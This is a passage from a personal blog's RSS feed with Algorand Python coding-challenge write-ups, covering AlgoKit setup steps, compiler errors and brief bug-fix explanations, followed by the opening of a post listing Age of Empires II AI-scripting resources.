&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python 3.12&lt;/a&gt; or later&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; (only required for LocalNet)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Initial setup&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone this repository locally&lt;/li&gt;
&lt;li&gt;Install pre-requisites:
&lt;ul&gt;
&lt;li&gt;Make sure to have &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; installed and running on your machine.&lt;/li&gt;
&lt;li&gt;Install &lt;code&gt;AlgoKit&lt;/code&gt; - &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli#install&quot;&gt;Link&lt;/a&gt;: The recommended version is &lt;code&gt;1.7.3&lt;/code&gt;. Ensure you can execute &lt;code&gt;algokit --version&lt;/code&gt; and get &lt;code&gt;1.7.1&lt;/code&gt; or later.&lt;/li&gt;
&lt;li&gt;Bootstrap your local environment; run &lt;code&gt;algokit bootstrap all&lt;/code&gt; within this folder, which will:
&lt;ul&gt;
&lt;li&gt;Install &lt;code&gt;Poetry&lt;/code&gt; - &lt;a href=&quot;https://python-poetry.org/docs/#installation&quot;&gt;Link&lt;/a&gt;: The minimum required version is &lt;code&gt;^1.7&lt;/code&gt;. Ensure you can execute &lt;code&gt;poetry -V&lt;/code&gt; and get &lt;code&gt;1.2&lt;/code&gt;+&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;poetry install&lt;/code&gt; in the root directory, which will set up a &lt;code&gt;.venv&lt;/code&gt; folder with a Python virtual environment and also install all Python dependencies&lt;/li&gt;
&lt;li&gt;Copy &lt;code&gt;.env.template&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;algokit localnet start&lt;/code&gt; to start a local Algorand network in Docker. If you are using VS Code launch configurations provided by the template, this will be done automatically for you.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open the project and start debugging / developing via:
&lt;ul&gt;
&lt;li&gt;VS Code
&lt;ol&gt;
&lt;li&gt;Open the repository root in VS Code&lt;/li&gt;
&lt;li&gt;Install recommended extensions&lt;/li&gt;
&lt;li&gt;Hit F5 (or whatever you have debug mapped to) and it should start running with breakpoint debugging.
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
If using Windows: Before running for the first time you will need to select the Python Interpreter.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open the command palette (Ctrl/Cmd + Shift + P)&lt;/li&gt;
&lt;li&gt;Search for &lt;code&gt;Python: Select Interpreter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;./.venv/Scripts/python.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;JetBrains IDEs (please note, this setup is primarily optimized for PyCharm Community Edition)
&lt;ol&gt;
&lt;li&gt;Open the repository root in the IDE&lt;/li&gt;
&lt;li&gt;It should automatically detect it&apos;s a Poetry project and set up a Python interpreter and virtual environment.&lt;/li&gt;
&lt;li&gt;Hit Shift+F10|Ctrl+R (or whatever you have debug mapped to) and it should start running with breakpoint debugging. Please note, JetBrains IDEs on Windows have a known bug that in some cases may prevent executing shell scripts as pre-launch tasks, for workarounds refer to &lt;a href=&quot;https://youtrack.jetbrains.com/issue/IDEA-277486/Shell-script-configuration-cannot-run-as-before-launch-task&quot;&gt;JetBrains forums&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Other
&lt;ol&gt;
&lt;li&gt;Open the repository root in your text editor of choice&lt;/li&gt;
&lt;li&gt;In a terminal run &lt;code&gt;poetry shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;python -m smart_contracts&lt;/code&gt; through your debugger of choice&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Subsequently&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;If you uppublished to the latest source code and there are new dependencies you will need to run &lt;code&gt;algokit bootstrap all&lt;/code&gt; again&lt;/li&gt;
&lt;li&gt;Follow step 3 above&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For guidance on &lt;code&gt;smart_contracts&lt;/code&gt; folder and adding new contracts to the project please see &lt;a href=&quot;smart_contracts/README.md&quot;&gt;README&lt;/a&gt; on the respective folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Tools&lt;/h1&gt;
&lt;p&gt;This project makes use of Algorand Python to build Algorand smart contracts. The following tools are in use:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.algorand.com/&quot;&gt;Algorand&lt;/a&gt; - Layer 1 Blockchain; &lt;a href=&quot;https://developer.algorand.org/&quot;&gt;Developer portal&lt;/a&gt;, &lt;a href=&quot;https://developer.algorand.org/docs/get-started/basics/why_algorand/&quot;&gt;Why Algorand?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli&quot;&gt;AlgoKit&lt;/a&gt; - One-stop shop tool for developers building on the Algorand network; &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/tutorials/intro.md&quot;&gt;intro tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;Algorand Python&lt;/a&gt; - A semantically and syntactically compatible, typed Python language that works with standard Python tooling and allows you to express smart contracts (apps) and smart signatures (logic signatures) for deployment on the Algorand Virtual Machine (AVM); &lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/puya/tree/main/examples&quot;&gt;examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-py&quot;&gt;AlgoKit Utils&lt;/a&gt; - A set of core Algorand utilities that make it easier to build solutions on Algorand.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://python-poetry.org/&quot;&gt;Poetry&lt;/a&gt;: Python packaging and dependency management.
It has also been configured to have a productive dev experience out of the box in &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VS Code&lt;/a&gt;, see the &lt;a href=&quot;./.vscode&quot;&gt;.vscode&lt;/a&gt; folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;GlobalState and LocalState weren&apos;t initialized because &lt;code&gt;(__Init__)&lt;/code&gt; was missing.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Added the &lt;code&gt;(__init__ )&lt;/code&gt; to the Counter class, so it initialized the GlobalState and LocalState.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafybeicsqnoepvc3jwwp6n7rnsuuf2oihprut6beyjs7q4o7boowi3yoze?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Algorand Coding Challenge - Volume 2:  Python #01.</title><link>https://alan.com.ar/posts/algochallengepython01/</link><guid isPermaLink="true">https://alan.com.ar/posts/algochallengepython01/</guid><pubDate>Wed, 03 Apr 2024 03:56:54 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Check out the &lt;a href=&quot;https://github.com/algorand-coding-challenges/python-challenge-1&quot;&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt; Challenge 1: My Vault Contract is failing to build! &lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;When compiling my Python smart contract, it fails to build. There seems to be 2 issues... &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Inside of &lt;code&gt;smart_contracts/personal_vault/contract.py&lt;/code&gt; file, there is a simple vault smart contract written in Algorand Python.&lt;/p&gt;
&lt;p&gt;It is a simple contract that has a &lt;code&gt;deposit&lt;/code&gt; function and a &lt;code&gt;withdraw&lt;/code&gt; function and the depositor&apos;s balance is recorded in a local state after they opt in to the smart contract with the &lt;code&gt;opt_in_to_app&lt;/code&gt; bare method.&lt;/p&gt;
&lt;p&gt;However, if you try to build and deploy the smart contract by opening Docker Desktop, and then running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;algokit bootstrap all
algokit localnet start
algokit project run build # Compile the smart contract and get low-level TEAL code.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;it will fail and show 2 errors:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;smart_contracts/personal_vault/contract.py:26 error: Unsupported operand types for == (&quot;Account&quot; and &quot;Application&quot;)  [operator]
ptxn.receiver == Global.current_application_id

smart_contracts/personal_vault/contract.py:30 error: Argument 2 to &quot;app_opted_in&quot; has incompatible type &quot;Account&quot;; expected &quot;Application | UInt64 | int&quot;  [arg-type]
Txn.sender, Global.current_application_address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Find out what is wrong and fix the bug.&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt; Meet other hackers working on this challenge and get help in the &lt;a href=&quot;https://discord.com/channels/491256308461207573/1182612934455722075&quot;&gt;Algorand Python Discord Channel&lt;/a&gt;!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Checkpoint 1:  Prerequisites&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Install Python 3.12 or higher&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/tree/main?tab=readme-ov-file#install&quot;&gt;Install AlgoKit&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Install &lt;a href=&quot;https://www.docker.com/products/docker-desktop/&quot;&gt;Docker&lt;/a&gt;. It is used to run a local Algorand network for development.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 2:  Set up your development environment&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/working-with-forks/fork-a-repo&quot;&gt;Fork this repository.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Clone the repository&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;cd [DIRECTORY_OF_YOUR_CHOICE]
git clone [FORKED_REPO_URL]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now you have 2 ways of opening your AlgoKit project.&lt;/p&gt;
&lt;h3&gt;With VSCode Workspaces&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Open the cloned repository with the code editor of your choosing.&lt;/li&gt;
&lt;li&gt;Open workspace mode by clicking &lt;code&gt;open workspace&lt;/code&gt; inside of &lt;code&gt;python-challenge-1.code-workspace&lt;/code&gt; file at the root level.&lt;/li&gt;
&lt;li&gt;Go inside of the &lt;code&gt;challenge&lt;/code&gt; folder.&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on. 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependecies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
5. Activate Python virtual environment by running:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Please note, in addition to built-in support for &lt;a href=&quot;https://code.visualstudio.com/docs/editor/workspaces&quot;&gt;VSCode Workspaces&lt;/a&gt;, the cli provides native support for monorepos called &lt;code&gt;algokit workspaces&lt;/code&gt;. Refer to &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/project/run.md#workspace-vs-standalone-projects&quot;&gt;documentation&lt;/a&gt; for detailed guidelines for recommended project structures and ability to leverage custom command orchestration via &lt;code&gt;algokit project run&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Without VSCode Workspaces&lt;/h3&gt;
&lt;p&gt;All AlgoKit projects initialized with &lt;code&gt;--workspace&lt;/code&gt; option has the following directory structure:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; projects
    smart-contract
    frontend # doesn&apos;t exist for this project
    ...
 {several config files...}
 ...
 .algokit.toml # workspace-typed algokit project config
 {project-name}.code-workspace
 README.md
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;So to access a single project under the &lt;code&gt;projects&lt;/code&gt; folder, it is recommended to &lt;code&gt;cd&lt;/code&gt; into the project you want to work with and then open your code editor (alternatively refer to VSCode Workspace file at the root). If you are reading this and didn&apos;t open the &lt;code&gt;challenge&lt;/code&gt; folder directly, go do that now!! &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;cd into &lt;code&gt;projects/challenge&lt;/code&gt; then open the code editor&lt;/li&gt;
&lt;li&gt;To setup your dev environment using AlgoKit, run the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project bootstrap all #algokit bootstrap all is being deprecated. Use this command from now on. 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This command will install all dependecies and also generate a &lt;code&gt;.env&lt;/code&gt; file for you.
3. Activate Python virtual environment by running below inside of &lt;code&gt;challenge&lt;/code&gt; folder:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;poetry shell
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;venv will automatically be activated the next time you open the project.&lt;/p&gt;
&lt;p&gt;Video walkthrough of forking and cloning this repository:&lt;/p&gt;
&lt;p&gt;https://github.com/algorand-fix-the-bug-campaign/challenge-1/assets/52557585/acde8053-a8dd-4f53-8bad-45de1068bfda&lt;/p&gt;
&lt;p&gt;Now you are ready to fix the bug!&lt;/p&gt;
&lt;h2&gt;Checkpoint 3:  Fix the bug &lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Open Docker Desktop and launch Algorand localnet by running &lt;code&gt;algokit localnet start&lt;/code&gt; in your terminal &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/features/localnet.md#creating--starting-the-localnet&quot;&gt;For more info click me!&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Go to &lt;code&gt;smart_contracts/personal_vault/contract.py&lt;/code&gt; and to see the source code of the personal vault smart contract.&lt;/li&gt;
&lt;li&gt;Try building the contract with &lt;code&gt;algokit project run build&lt;/code&gt;. It will fail.&lt;/li&gt;
&lt;li&gt;Read the error, figure out what is wrong and fix the bug!&lt;/li&gt;
&lt;li&gt;After fixing the bug, build and run the deploy script with the below command:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;algokit project run build
algokit project deploy localnet
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;OR if you are on VSCode, hit F5 or go to the &lt;code&gt;Run and Debug&lt;/code&gt; tab and run the debug script.&lt;/p&gt;
&lt;p&gt;If you see something like this in the console, you successfully fixed the bug! 
&amp;lt;img width=&quot;1293&quot; alt=&quot;image&quot; src=&quot;https://github.com/algorand-coding-challenges/python-challenge-1/assets/52557585/5879f852-e356-4616-9b11-35e0d210ec81&quot;&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt; Are you struggling?&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.algorand.org/docs/get-details/ethereum_to_algorand/?from_query=ethereunm#accounts-and-smart-contracts&quot;&gt;Algorand Smart Contract Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://algorandfoundation.github.io/puya/api-algopy.html#algopy.Global:~:text=current_application_address%3A%20Final%5B,executing.%20Application%20mode%20only.&quot;&gt;Algorand Python Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;AlgoKit CLI Documentation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Checkpoint 4:  Submit your answer&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;After fixing the bug, push your code to your forked Github repo and &lt;a href=&quot;https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request-from-a-fork&quot;&gt;make a PR to the original repo.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Inside the PR include:
&lt;ol&gt;
&lt;li&gt;What was the problem?&lt;/li&gt;
&lt;li&gt;How did you solve the problem?&lt;/li&gt;
&lt;li&gt;Screenshot of your terminal showing the result of running the deploy script.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;Checkpoint 5:  Claim your certificate of completion NFT! &lt;/h2&gt;
&lt;p&gt;The Algorand Developer Relations team will review the submission and &quot;approve&quot; the PR by labeling it &lt;code&gt;Approved&lt;/code&gt;. Once it&apos;s approved, we will share the magic link to claim your certificate of completion NFT in the comment of the PR!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The certificate of completion NFT is a verifiable credential minted on the &lt;a href=&quot;https://goplausible.com/&quot;&gt;GoPlausible platform&lt;/a&gt; that follows the W3C standard for certificates and OpenBadges standard for badges.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The certificate of completion NFT for Python challenges were designed by &lt;a href=&quot;https://twitter.com/MaarsComics&quot;&gt;Maars&lt;/a&gt;, an artist &amp;amp; a dev in web3. Definitely follow his work! It&apos;s awesome. &lt;/p&gt;
&lt;p&gt; Congratulations on completing the challenge Algodev! This was the final challenge of the 1st season of #AlgoCodingChallenge. Be on the lookout for the 2nd season of #AlgoCodingChallenge!&lt;/p&gt;
&lt;h2&gt;Below is the default readme of the Python AlgoKit Template. Read to learn more about this template.&lt;/h2&gt;
&lt;p&gt;This project has been generated using AlgoKit. See below for default getting started instructions.&lt;/p&gt;
&lt;h1&gt;Setup&lt;/h1&gt;
&lt;h3&gt;Pre-requisites&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/downloads/&quot;&gt;Python 3.12&lt;/a&gt; or later&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; (only required for LocalNet)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Initial setup&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Clone this repository locally&lt;/li&gt;
&lt;li&gt;Install pre-requisites:
&lt;ul&gt;
&lt;li&gt;Make sure to have &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; installed and running on your machine.&lt;/li&gt;
&lt;li&gt;Install &lt;code&gt;AlgoKit&lt;/code&gt; - &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli#install&quot;&gt;Link&lt;/a&gt;: The recommended version is &lt;code&gt;1.7.3&lt;/code&gt;. Ensure you can execute &lt;code&gt;algokit --version&lt;/code&gt; and get &lt;code&gt;1.7.1&lt;/code&gt; or later.&lt;/li&gt;
&lt;li&gt;Bootstrap your local environment; run &lt;code&gt;algokit bootstrap all&lt;/code&gt; within this folder, which will:
&lt;ul&gt;
&lt;li&gt;Install &lt;code&gt;Poetry&lt;/code&gt; - &lt;a href=&quot;https://python-poetry.org/docs/#installation&quot;&gt;Link&lt;/a&gt;: The minimum required version is &lt;code&gt;^1.7&lt;/code&gt;. Ensure you can execute &lt;code&gt;poetry -V&lt;/code&gt; and get &lt;code&gt;1.2&lt;/code&gt;+&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;poetry install&lt;/code&gt; in the root directory, which will set up a &lt;code&gt;.venv&lt;/code&gt; folder with a Python virtual environment and also install all Python dependencies&lt;/li&gt;
&lt;li&gt;Copy &lt;code&gt;.env.template&lt;/code&gt; to &lt;code&gt;.env&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;algokit localnet start&lt;/code&gt; to start a local Algorand network in Docker. If you are using VS Code launch configurations provided by the template, this will be done automatically for you.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open the project and start debugging / developing via:
&lt;ul&gt;
&lt;li&gt;VS Code
&lt;ol&gt;
&lt;li&gt;Open the repository root in VS Code&lt;/li&gt;
&lt;li&gt;Install recommended extensions&lt;/li&gt;
&lt;li&gt;Hit F5 (or whatever you have debug mapped to) and it should start running with breakpoint debugging.
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;
If using Windows: Before running for the first time you will need to select the Python Interpreter.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol&gt;
&lt;li&gt;Open the command palette (Ctrl/Cmd + Shift + P)&lt;/li&gt;
&lt;li&gt;Search for &lt;code&gt;Python: Select Interpreter&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Select &lt;code&gt;./.venv/Scripts/python.exe&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;JetBrains IDEs (please note, this setup is primarily optimized for PyCharm Community Edition)
&lt;ol&gt;
&lt;li&gt;Open the repository root in the IDE&lt;/li&gt;
&lt;li&gt;It should automatically detect it&apos;s a Poetry project and set up a Python interpreter and virtual environment.&lt;/li&gt;
&lt;li&gt;Hit Shift+F10|Ctrl+R (or whatever you have debug mapped to) and it should start running with breakpoint debugging. Please note, JetBrains IDEs on Windows have a known bug that in some cases may prevent executing shell scripts as pre-launch tasks, for workarounds refer to &lt;a href=&quot;https://youtrack.jetbrains.com/issue/IDEA-277486/Shell-script-configuration-cannot-run-as-before-launch-task&quot;&gt;JetBrains forums&lt;/a&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Other
&lt;ol&gt;
&lt;li&gt;Open the repository root in your text editor of choice&lt;/li&gt;
&lt;li&gt;In a terminal run &lt;code&gt;poetry shell&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;python -m smart_contracts&lt;/code&gt; through your debugger of choice&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Subsequently&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;If you uppublished to the latest source code and there are new dependencies you will need to run &lt;code&gt;algokit bootstrap all&lt;/code&gt; again&lt;/li&gt;
&lt;li&gt;Follow step 3 above&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;For guidance on &lt;code&gt;smart_contracts&lt;/code&gt; folder and adding new contracts to the project please see &lt;a href=&quot;smart_contracts/README.md&quot;&gt;README&lt;/a&gt; on the respective folder.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Tools&lt;/h1&gt;
&lt;p&gt;This project makes use of Algorand Python to build Algorand smart contracts. The following tools are in use:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.algorand.com/&quot;&gt;Algorand&lt;/a&gt; - Layer 1 Blockchain; &lt;a href=&quot;https://developer.algorand.org/&quot;&gt;Developer portal&lt;/a&gt;, &lt;a href=&quot;https://developer.algorand.org/docs/get-started/basics/why_algorand/&quot;&gt;Why Algorand?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli&quot;&gt;AlgoKit&lt;/a&gt; - One-stop shop tool for developers building on the Algorand network; &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/algokit.md&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/algokit-cli/blob/main/docs/tutorials/intro.md&quot;&gt;intro tutorial&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;Algorand Python&lt;/a&gt; - A semantically and syntactically compatible, typed Python language that works with standard Python tooling and allows you to express smart contracts (apps) and smart signatures (logic signatures) for deployment on the Algorand Virtual Machine (AVM); &lt;a href=&quot;https://github.com/algorandfoundation/puya&quot;&gt;docs&lt;/a&gt;, &lt;a href=&quot;https://github.com/algorandfoundation/puya/tree/main/examples&quot;&gt;examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/algorandfoundation/algokit-utils-py&quot;&gt;AlgoKit Utils&lt;/a&gt; - A set of core Algorand utilities that make it easier to build solutions on Algorand.&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://python-poetry.org/&quot;&gt;Poetry&lt;/a&gt;: Python packaging and dependency management.
It has also been configured to have a productive dev experience out of the box in &lt;a href=&quot;https://code.visualstudio.com/&quot;&gt;VS Code&lt;/a&gt;, see the &lt;a href=&quot;./.vscode&quot;&gt;.vscode&lt;/a&gt; folder.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Solution:&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;What was the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The console showed 2 errors in the contract:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;smart_contracts/personal_vault/contract.py:26 error: Unsupported operand types for == (&quot;Account&quot; and &quot;Application&quot;)  [operator]
ptxn.receiver == Global.current_application_id

smart_contracts/personal_vault/contract.py:30 error: Argument 2 to &quot;app_opted_in&quot; has incompatible type &quot;Account&quot;; expected &quot;Application | UInt64 | int&quot;  [arg-type]
Txn.sender, Global.current_application_address
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Turns out there was a type mismatch in a comparison within the deposit function.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;How did you fix the bug?&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Swapping Global.current_application_id and Global.current_application_address solved the issue.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://ipfs.algonode.xyz/ipfs/bafybeiaqbaxonxcuhmyq5fugwk6huvpunvu3dwrjz4hcgs53cmuyr4yog4?optimizer=image&amp;amp;width=600&quot; alt=&quot;cert&quot; /&gt;&lt;/p&gt;
</content:encoded></item><item><title>Age of Empires II - AI Scripting.</title><link>https://alan.com.ar/posts/aoeaiscripting/</link><guid isPermaLink="true">https://alan.com.ar/posts/aoeaiscripting/</guid><pubDate>Mon, 01 Apr 2024 03:24:52 GMT</pubDate><content:encoded>&lt;p&gt;This is a brief introduction to AI scripting in Age Of Empires II. In the following resources you may find an in depth overview of the tools and relevant settings.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Resources:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PL8UM8VqZhE0tRwdn-uvTUSvugUOArNc_j&quot;&gt;interlepus YouTube Playlist (English)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PL0EWYDbi48enyAJUlIynOpe7HxBHU2tt7&quot;&gt;arandi YouTube Playlist (English)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PLcOYlGU7ZRqhsuMxaOwP4Ztl7Wfp-Ns_H&quot;&gt;AI Game Junction YouTube Playlist (English)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PLl7E3Sjv1CvOQyCqS9ZZ3U5qToJkExo_2&quot;&gt;Igor Hernndez YouTube Playlist (Spanish)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://userpatch.aiscripters.net&quot;&gt;UserPatch AI Scripters&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://aok.heavengames.com/university/other/world-of-ai-scripting-chapter-1/&quot;&gt;AoK Heaven Games - World of AI Scripting Chapter 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://archive.org/download/aoe-tce-manual-and-guide/CPSB.DOC&quot;&gt;Microsoft&apos;s Computer Player Strategy Builder Guide Documentation&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://airef.github.io/index.html&quot;&gt;AI Scripting Encyclopedia&lt;/a&gt; by &lt;a href=&quot;https://github.com/airef&quot;&gt;airef&lt;/a&gt;&lt;/li&gt;
